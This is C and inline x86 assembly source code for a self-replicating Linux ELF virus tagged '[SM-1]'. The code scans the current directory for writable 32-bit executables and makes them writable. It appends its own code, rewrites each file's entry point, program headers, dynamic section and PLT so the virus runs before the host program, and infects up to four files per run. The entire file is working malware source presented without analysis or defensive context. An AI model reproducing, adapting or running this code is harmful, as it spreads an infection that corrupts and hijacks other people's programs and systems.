#include <sys/types.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <unistd.h>
#include <elf.h>
#include <fcntl.h>

#define MAX_FILE_SIZE 15728640
#define MAX_DIR_SIZE 15728640
#define HASH_PRG 0x95C1245
#define HASH_END 0x65C44
#define HASH_ENV 0xC5D093E
#define FIX_SEG 1
#define FIX_ADR 2
#define NUM 0x4

enum {false, true};

typedef struct {
	void *dir_map;
	int dir_siz;
	void *dir_ptr;
	void *dir_end;
	uid_t euid;
	char *fn;
	int n;
	struct stat fstat;
} find_elf_data;

typedef struct {
	int flags;
	int host_ep;		/* 0x04 */
	int s1_vaddr;
	int s1_memsz;
	int s1_flags;
	int s2_vaddr;
	int s2_memsz;
	int s2_flags;
} com_data;

typedef struct {
	com_data com;
	int s2_src;		/* 0x20 */
	int s2_dst;
	int s2_fsz;
} fix_seg_data;

typedef struct {
	fix_seg_data fix_seg;
	int offset;
	int rel_plt_vaddr;
	int rel_plt_num;
	int rel_plt_ent_size;
	int plt_vaddr;
	int plt_end;
} fix_adr_data;

typedef union {
	com_data com;
	fix_seg_data fix_seg;
	fix_adr_data fix_adr;
} code_data;

typedef struct {
	uint32_t begin;
	uint32_t end;
	uint32_t offset;
} obj_ghost;

typedef struct {
	Elf32_Rel *reltab;
	int relnum;
	Elf32_Sym *dynsym;
	char *dynstr;
	uint32_t *hashtab;
	uint32_t rel_plt_vaddr;
	uint32_t rel_plt_size;
} obj_dyn;


int digest_phdr(Elf32_Ehdr *, Elf32_Phdr *[], Elf32_Dyn **, int *);
int digest_dynamic(Elf32_Dyn *, obj_dyn *, obj_ghost *, Elf32_Ehdr *);
int set_sym_value(uint32_t, char *, obj_dyn *, int);
int fix_addr(uint32_t *, obj_ghost *);
int inject(int, int, int, int);
int find_elf(find_elf_data *);
int scmp(char *, char *);
int int0x80(int, ...);
int turn_flags(int);
void *get_offset(uint32_t, Elf32_Ehdr *);
void code_start(void);
void code_end(void);
void restore(void);


int main()
{
	code_start();
	return 0;
}

asm(
"		.set	MPROTECT,74		\n"	/* Check it for your version */
"		.globl	restore			\n"
"restore:	call	1f			\n"
"1:		popl	%eax			\n"
"		addl	$(code_end-1b),%eax	\n"
"		pushal				\n"
"		movl	%esp,%ebp		\n"
"		testb	$1,(%eax)		\n"
"		jz	1f			\n"
"		leal	0x20(%eax),%esp		\n"
"		popl	%esi			\n"
"		popl	%edi			\n"
"		popl	%ecx			\n"
"		std				\n"
"		rep				\n"
"		movsb				\n"
"		testb	$2,(%eax)		\n"
"		jz	1f			\n"
"		popl	%edx			\n"
"		popl	%edi			\n"
"		popl	%ecx			\n"
"		popl	%ebx			\n"
"2:		addl	%edx,(%edi)		\n"
"		addl	%ebx,%edi		\n"
"		loop	2b			\n"
"		popl	%esi			\n"
"		popl	%edi			\n"
"		addl	%edx,0x06(%esi)		\n"
"2:		addl	%edx,(%esi)		\n"
"		addl	$0x10,%esi		\n"
"		cmpl	%esi,%edi		\n"
"		ja	2b			\n"
"1:		leal	0x04(%eax),%esp		\n"
"		movl	$MPROTECT,%eax		\n"
"		int 	$0x80			\n"	/* Don't care CF */
"		addl	$0x0C,%esp		\n"
"		movl	$MPROTECT,%eax		\n"
"		int	$0x80			\n"	/* Don't care CF */
"		movl	%ebp,%esp		\n"
"		call	code_start		\n"
"		popal				\n"
"		movl	0x04(%eax),%eax		\n"
"		jmp	*%eax			\n"
);

void code_start()
{
	int code_addr, code_size, fd;
	find_elf_data fed;

	__asm__ __volatile__(
"		call 1f				\n"
"id:		.asciz \"[SM-1]\"		\n"
"1:		popl %0				\n"
"		subl $(id-restore),%0		\n"
		:"=q"(code_addr)
	);

	code_size = &code_end - &restore;
	fed.dir_map = NULL;
	fed.n = 0x0;

	while (find_elf(&fed)) {
		int0x80(SYS_chmod, fed.fn, (mode_t)fed.fstat.st_mode|S_IRUSR|S_IWUSR);

		if ((fd = int0x80(SYS_open, fed.fn, O_RDWR|O_APPEND)) >= 0) {
			fed.n += inject(code_addr, code_size, fd, fed.fstat.st_size);
			if (int0x80(SYS_close, fd))
				fed.n = NUM;
		}

		int0x80(SYS_chmod, fed.fn, (mode_t)fed.fstat.st_mode);
	}
}

int inject(int code_addr, int code_size, int obj_fd, int obj_size)
{
	int cd_size, base_addr, status, i;
	Elf32_Phdr *phtab, *phl[2];
	Elf32_Dyn *dyntab;
	Elf32_Ehdr *eh;
	code_data cd;
	obj_ghost ghost;
	obj_dyn dyn;
	int plt_vaddr, plt_size;
	char *plt, *plt_end;
 	int str_prg[3], str_end[2];

	/* FIXME */
	str_prg[0] = 0x72705F5F;	/* __progname */
	str_prg[1] = 0x616E676F;
	str_prg[2] = 0x656D;
	str_end[0] = 0x646e655f;	/* _end */
	str_end[1] = 0x00;

	status = false;

	/* Get object */
	if ((eh = (Elf32_Ehdr *)int0x80(SYS_mmap, NULL, (size_t)obj_size,
	    PROT_READ|PROT_WRITE, MAP_SHARED, obj_fd, (off_t)0)) == MAP_FAILED)
	    	return status;

	if (digest_phdr(eh, phl, &dyntab, &base_addr))
		goto unmap;
	if (ghost.offset = phl[1]->p_vaddr -
	    (phl[1]->p_offset - phl[0]->p_offset + phl[0]->p_vaddr)) {
		ghost.begin = phl[1]->p_vaddr;
		ghost.end = ghost.begin + phl[1]->p_filesz;
		if (dyntab) {
			if (digest_dynamic(dyntab, &dyn, &ghost, eh))
				goto unmap;
			/* Sick */
			if (find_plt(eh, &plt, &plt_size, &plt_vaddr))
				goto unmap;
		}
	}

	/* Collecting data */
	cd.com.flags = 0x0;
	cd.com.host_ep = eh->e_entry;
	cd.com.s1_vaddr = phl[0]->p_vaddr;
	cd.com.s1_memsz = phl[0]->p_memsz;
	cd.com.s1_flags = turn_flags(phl[0]->p_flags);
	cd.com.s2_vaddr = phl[1]->p_vaddr;
	cd.com.s2_memsz = phl[1]->p_memsz;
	cd.com.s2_flags = turn_flags(phl[1]->p_flags);
	cd_size = sizeof(cd.com);
	if (ghost.offset) {
		cd.com.flags |= FIX_SEG;
		cd.fix_seg.s2_src = phl[0]->p_vaddr +
		    (phl[1]->p_offset - phl[0]->p_offset + phl[1]->p_filesz - 1);
		cd.fix_seg.s2_dst = ghost.end - 1;
		cd.fix_seg.s2_fsz = phl[1]->p_filesz;
		cd_size = sizeof(cd.fix_seg);
		if (dyntab) {
			cd.com.flags |= FIX_ADR;
			cd.fix_adr.offset = ghost.offset;
			cd.fix_adr.rel_plt_vaddr = dyn.rel_plt_vaddr;
			cd.fix_adr.rel_plt_num = dyn.rel_plt_size / sizeof(Elf32_Rel);
			cd.fix_adr.rel_plt_ent_size = sizeof(Elf32_Rel);
			cd.fix_adr.plt_vaddr = plt_vaddr;
			cd.fix_adr.plt_end = plt_vaddr + plt_size;
		 	cd_size = sizeof(cd.fix_adr);
		}
	}

	/* MAP_SHARED */
	if (int0x80(SYS_write, obj_fd, code_addr, code_size) < code_size)
		goto unmap;
	if (int0x80(SYS_write, obj_fd, &cd, cd_size) < cd_size)
		goto unmap;

	/* Merge */
	eh->e_entry = ((base_addr - code_size - cd_size - (obj_size & 0xFFF))
	    & 0xFFFFF000) + (obj_size & 0xFFF);

	phl[1]->p_filesz = phl[1]->p_offset - phl[0]->p_offset + phl[1]->p_filesz;
	phl[1]->p_memsz  = phl[1]->p_vaddr  - phl[0]->p_vaddr  + phl[1]->p_memsz;
	phl[1]->p_vaddr  = phl[1]->p_paddr  = phl[0]->p_vaddr;
	phl[1]->p_offset = phl[0]->p_offset;
	phl[1]->p_flags  = PF_R|PF_W;
	phl[0]->p_offset = obj_size;
	phl[0]->p_vaddr  = phl[0]->p_paddr = eh->e_entry;
	phl[0]->p_filesz = phl[0]->p_memsz = code_size + cd_size;
	phl[0]->p_flags  = PF_R|PF_X;

	if (ghost.offset) {
		phtab = (void *)eh + eh->e_phoff;
		for (i = 0; i < eh->e_phnum; i++)
			if (fix_addr(&phtab[i].p_vaddr, &ghost))
				phtab[i].p_paddr = phtab[i].p_vaddr;
		if (dyntab) {
			/* Actually we have to check, is it d_ptr or d_val. */
			for (i = 0; dyntab[i].d_tag != DT_NULL; i++)
				fix_addr(&dyntab[i].d_un.d_ptr, &ghost);
			for (i = 0; i < dyn.relnum; i++)
				fix_addr(&dyn.reltab[i].r_offset, &ghost);
			/* Sick */
			*(int *)&plt[6] -= ghost.offset;
			for (plt_end = plt + plt_size; plt < plt_end; plt += 0x10)
				*(int *)plt -= ghost.offset;
//			i = phl[1]->p_vaddr + phl[1]->p_memsz;
//			if (set_sym_value(HASH_PRG, (char *)str_prg, &dyn, i)) {
//				phl[1]->p_memsz += 4;
//				set_sym_value(HASH_END, (char *)str_end, &dyn, i+4);
//			}
			i = (phl[1]->p_vaddr + phl[1]->p_memsz + 0xfff) & 0xfffff000;
			if (set_sym_value(HASH_PRG, (char *)str_prg, &dyn, i)) {
				phl[1]->p_memsz = i - phl[1]->p_vaddr + 4;
				set_sym_value(HASH_END, (char *)str_end, &dyn, i+4);
			}
		}
	}
	status = true;

unmap:	int0x80(SYS_munmap, (void *)eh, (size_t)obj_size);
	return status;
}

int digest_phdr(Elf32_Ehdr *eh, Elf32_Phdr *phl[], Elf32_Dyn **dyntab, int *base_addr)
{
	Elf32_Phdr *ph, *phend;
	int i;

	*dyntab = NULL;
	ph = (void *)eh + eh->e_phoff;
	phend = (void *)ph + eh->e_phnum * sizeof(Elf32_Phdr);
	for (i = 0; ph < phend; ++ph) {
		if (ph->p_type == PT_LOAD) {
			if (i >= 2)
				return 1;
			phl[i++] = ph;
		} else
		if (ph->p_type == PT_DYNAMIC)
			*dyntab = (void *)eh + ph->p_offset;
	}
	if (i != 2 || eh->e_entry == phl[0]->p_vaddr ||
	    phl[0]->p_vaddr > phl[1]->p_vaddr || phl[0]->p_filesz != phl[0]->p_memsz)
		return 1;

	*base_addr = phl[0]->p_vaddr & 0xfffff000;
	return 0;
}

int digest_dynamic(Elf32_Dyn *dyntab, obj_dyn *dyn, obj_ghost *ghost, Elf32_Ehdr *eh)
{
	uint32_t val, tag, relbase;

	for (val = 0; val < sizeof(obj_dyn); val++)
		((char *)dyn)[val] = 0x0;

	relbase = 0xFFFFFFFF;
	while ((tag = dyntab->d_tag) != DT_NULL) {
		val = dyntab->d_un.d_val;
		if (tag == DT_JMPREL) {
			if (fix_addr(&val, ghost))
				return 1;
			dyn->rel_plt_vaddr = val;
			if (val < relbase)
				relbase = val;
		} else
		if (tag == DT_REL) {
			if (val < relbase)
				relbase = val;
		} else
		if (tag == DT_PLTRELSZ) {
			dyn->rel_plt_size = val;
			dyn->relnum += val / sizeof(Elf32_Rel);
		} else
		if (tag == DT_RELSZ) {
			dyn->relnum += val / sizeof(Elf32_Rel);
		} else
		if (tag == DT_RELENT) {
			if (val != sizeof(Elf32_Rel))
				return 1;
		} else
		if (tag == DT_SYMENT) {
			if (val != sizeof(Elf32_Sym))
				return 1;
		} else
		if (tag == DT_PLTGOT) {
			if (!fix_addr(&val, ghost))
				return 1;
		} else
		if (tag == DT_STRTAB) {
			if (fix_addr(&val, ghost))
				return 1;
			dyn->dynstr = get_offset(val, eh);
		} else
		if (tag == DT_SYMTAB) {
			if (fix_addr(&val, ghost))
				return 1;
			dyn->dynsym = get_offset(val, eh);
		} else
		if (tag == DT_HASH) {
			if (fix_addr(&val, ghost))
				return 1;
			dyn->hashtab = get_offset(val, eh);
		}
		dyntab++;
	}
	if (!dyn->hashtab || !dyn->dynsym || !dyn->dynstr || !dyn->rel_plt_vaddr)
		return 1;

	dyn->reltab = get_offset(relbase, eh);
	return 0;
}

asm(
"		.globl	turn_flags		\n"
"turn_flags:	pushl	%ecx			\n"
"		pushl	%edx			\n"
"		movl	0xC(%esp),%edx		\n"
"		xorl	%eax,%eax		\n"
"		movl	$0x3,%ecx		\n"
"1:		rcrl	$0x1,%edx		\n"
"		rcll	$0x1,%eax		\n"
"		loop	1b			\n"
"		popl	%edx			\n"
"		popl	%ecx			\n"
"		ret				\n"
);

int find_plt(Elf32_Ehdr *eh, char **plt, int *plt_size, int *plt_vaddr)
{
	Elf32_Shdr *shtab;
	char str_plt[5];
	char *strtab;
	int i;

	/* FIXME */
	*(int *)&str_plt[0] = 0x746c702e;	/* .plt */
	str_plt[4] = 0x0;

	shtab  = (void *)eh + eh->e_shoff;
	strtab = (void *)eh + shtab[eh->e_shstrndx].sh_offset;
	for (i = 0; i < eh->e_shnum; i++)
		if (!scmp(strtab + shtab[i].sh_name, str_plt)) {
			*plt = (void *)eh + shtab[i].sh_offset + 2;
			*plt_vaddr = shtab[i].sh_addr + 2;
			*plt_size = shtab[i].sh_size - 2 ;
			return 0;
		}
	return 1;
}

int set_sym_value(uint32_t sym_hash, char *sym_name, obj_dyn *dyn, int value)
{
	uint32_t nbucket = dyn->hashtab[0];
	uint32_t *bucket = dyn->hashtab + 2;
	uint32_t *chain = bucket + nbucket;
	int i;

	for (i = bucket[sym_hash % nbucket]; i != STN_UNDEF; i = chain[i])
		if (!scmp(sym_name, dyn->dynstr + dyn->dynsym[i].st_name)) {
			dyn->dynsym[i].st_value = value;
			return 1;
		}
	return 0;
}

asm(
"		.globl	scmp			\n"
"scmp:		pushl	%esi			\n"
"		pushl	%edi			\n"
"		movl	0x0C(%esp),%esi		\n"
"		movl	0x10(%esp),%edi		\n"
"		xorl	%eax,%eax		\n"
"1:		movb	(%esi),%al		\n"
"		testb	%al,%al			\n"
"		jz	2f			\n"
"		cmpb	%al,(%edi)		\n"
"		jnz	2f			\n"
"		incl	%esi			\n"
"		incl	%edi			\n"
"		jmp	1b			\n"
"2:		subb	(%edi),%al		\n"
"		popl	%edi			\n"
"		popl	%esi			\n"
"		ret				\n"
);

int fix_addr(uint32_t *ptr, obj_ghost *ghost)
{
	if (*ptr >= ghost->begin && *ptr < ghost->end) {
		*ptr -= ghost->offset;
		return 1;
	}
	return 0;
}

void * get_offset(uint32_t addr, Elf32_Ehdr *eh)
{
	Elf32_Phdr *phtab;
	int i;

	phtab = (void *)eh + eh->e_phoff;
	for (i = 0; i < eh->e_phnum; i++) {
		if (phtab[i].p_type != PT_LOAD)
			continue;
		if (addr >= phtab[i].p_vaddr &&
		    addr < phtab[i].p_vaddr + phtab[i].p_filesz)
			return (void *)eh + (phtab[i].p_offset + (addr - phtab[i].p_vaddr));
	}
	return NULL;
}

int find_elf(find_elf_data *fed)
{
	Elf32_Ehdr ehdr;
	struct dirent *e;
	struct stat s;
	int fn, fd, n;
	void *p;

	if (fed->dir_map == NULL) {
		fn = '.';
		if (int0x80(SYS_stat, &fn, &s))
			return 0;
		if (s.st_size > MAX_DIR_SIZE)
			return 0;
		if ((p = (void *)int0x80(SYS_mmap, NULL, (size_t)s.st_size,
		    PROT_READ|PROT_WRITE, MAP_ANON, -1, (off_t)0)) == MAP_FAILED)
			return 0;
		if ((fd = int0x80(SYS_open, &fn, O_RDONLY)) < 0)
			return 0;		/* munmap() */
		if (int0x80(SYS_getdents, fd, (char *)p, (int)s.st_size) != (int)s.st_size)
			return 0;		/* munmap(), close() */
		if (int0x80(SYS_close, fd))
			return 0;		/* munmap() */

		fed->dir_map = fed->dir_ptr = p;
		fed->dir_siz = (int)s.st_size;
		fed->dir_end = p + (int)s.st_size;
		fed->euid = int0x80(SYS_geteuid);
	}

	if (fed->n >= NUM)
		goto end;

	for (e = p = fed->dir_ptr; p < fed->dir_end && e->d_reclen; e = p += e->d_reclen) {
		if (e->d_type != DT_REG || e->d_fileno == 0)
			continue;
		if (int0x80(SYS_stat, &e->d_name, &fed->fstat))
			continue;
		if (!(fed->fstat.st_mode & (mode_t)(S_IXUSR|S_IXGRP|S_IXOTH)))
			continue;
		if (fed->fstat.st_uid != fed->euid &&
		    int0x80(SYS_eaccess, &e->d_name, R_OK|W_OK))
		    	continue;
		if (fed->fstat.st_size < sizeof(ehdr) ||
		    fed->fstat.st_size > MAX_FILE_SIZE)
			continue;

		if ((fd = int0x80(SYS_open, &e->d_name, O_RDONLY)) < 0)
			continue;
		n = int0x80(SYS_read, fd, (char *)&ehdr, (size_t)sizeof(ehdr));
		if (int0x80(SYS_close, fd))
			break;
		if (n != sizeof(ehdr))
			continue;
		
		if (*(int *)&ehdr.e_ident[0] != 0x464C457F || 
		    *(int *)&ehdr.e_ident[4] != 0x09010101 ||
		    ehdr.e_type != ET_EXEC || ehdr.e_machine != EM_386 ||
		    ehdr.e_version != EV_CURRENT || !ehdr.e_entry ||
		    ehdr.e_ehsize != sizeof(ehdr) || !ehdr.e_shstrndx ||
		    !ehdr.e_phoff || ehdr.e_phentsize != sizeof(Elf32_Phdr) ||
		    !ehdr.e_shoff || ehdr.e_shentsize != sizeof(Elf32_Shdr) ||
		    !ehdr.e_phnum || !ehdr.e_shnum || ehdr.e_phnum == PN_XNUM)
		    	continue;
		
		fed->fn = (char *)&e->d_name;
		fed->dir_ptr = p + e->d_reclen;
		return 1;
	}

end:	int0x80(SYS_munmap, fed->dir_map, fed->dir_siz);
	return 0;
}

asm(
"		.globl	int0x80			\n"
"int0x80:	popl	%ecx			\n"
"		popl	%eax			\n"
"		pushl	%ecx			\n"
"		int	$0x80			\n"
"		jnc	1f			\n"
"		xorl	%eax,%eax		\n"
"		decl	%eax			\n"
"1:		pushl	%ecx			\n"
"		ret				\n"
);

void code_end() {};
